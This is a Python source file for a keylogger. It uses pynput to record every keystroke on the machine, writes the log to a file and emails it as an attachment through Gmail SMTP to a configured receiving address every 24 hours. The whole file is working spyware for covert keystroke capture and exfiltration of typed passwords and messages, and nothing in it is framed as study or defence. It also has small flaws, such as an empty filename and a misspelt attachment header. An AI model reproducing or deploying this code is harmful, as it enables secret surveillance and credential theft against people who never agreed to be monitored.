#!/usr/bin/env python
# -*- coding: utf-8 -*-
# reading writing to files

# getting keystrokes
from pynput import keyboard

# for emailing
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

# for measuring dates and timers
from threading import Timer
from datetime import datetime

# static variables

EMAIL = "" #insert email that will send files
EMAILPASS = "" # email sender password
TIMER = 86400 # time is automatically set for 24 hrs
EMAILRECIVE = "" #email that will recive all files
LOGGING = True



class KeyLogger:
    def __init__(self, interval):
        self.interval = interval
        self.filename = "keylog"
        # the string that logs keystrokes
        self.log = ""
        # records date and time of starting and ending
        self.startDate = datetime.now()
        self.filename = ""
        self.start()

    def on_press(self, key):
        # here is where we detect keys
        name = str(key)
        if len(name) > 1:
            # for special keys
            if name == "Key.space":
                name = " "
            elif name == "Key.enter":
                name = "[ENTER]\n"
            elif name == "Key.backspace":
                name = "[Del]"
                # self.log = self.log[:-1]
        name = name.replace("Key.", "")
        name = name.replace("\'", "")
        self.log += name
        # print(self.log)  # testing purposes
# naming was causing problems
#    def naming(self):
#        startdatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
#        self.filename = "keylog-"+str(startdatestr)

    def carrierpidgeon(self, email, password, reciver, logstr, subject):
        # subject will act as the subject and file name to keep code more simple
        # for attaching files
        # setting up MIMEMultipart
        # (https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python)

        mime = MIMEMultipart()
        mime['From'] = email
        mime['To'] = reciver
        mime['Subject'] = subject
        # body and attachments
        mime.attach(MIMEText(logstr, 'plain'))
        attach_file = open(subject + ".txt", 'rb')

        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload(attach_file.read())
        encoders.encode_base64(payload)  # encodes attatchment
        # add header with filename
        payload.add_header('Content-Decomposition', 'attachment', filename=subject)
        mime.attach(payload)

        # pings server if respoinse comes back it sends email(had issues with code trying to send when internet down)
        hostname = "smtp.gmail.com"
        response = os.system("ping -c 1 " + hostname)
        # and then check the response
        if response == 0:
            # print(hostname, 'is up!')
            # connect to mail server
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            # logging in
            server.login(email, password)
            text = mime.as_string()
            server.sendmail(email, reciver, text)
            server.quit()
            self.log = ""

    def report(self):
        f = open(str(self.filename) + ".txt", 'w')
        # self.naming()
        if self.log:
            try:
                f.write(self.log)
                f.close()
            finally:
                try:
                    self.carrierpidgeon(EMAIL, EMAILPASS, EMAILRECIVE, self.log, self.filename)
                finally:
                    self.startDate = datetime.now()

        timer = Timer(interval=self.interval, function=self.report)
        # start the timer
        timer.start()

    def start(self):
        self.startDate = datetime.now()
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.report()


if __name__ == "__main__":
    # make interval TIMER after done testing
    k = KeyLogger(interval=TIMER)
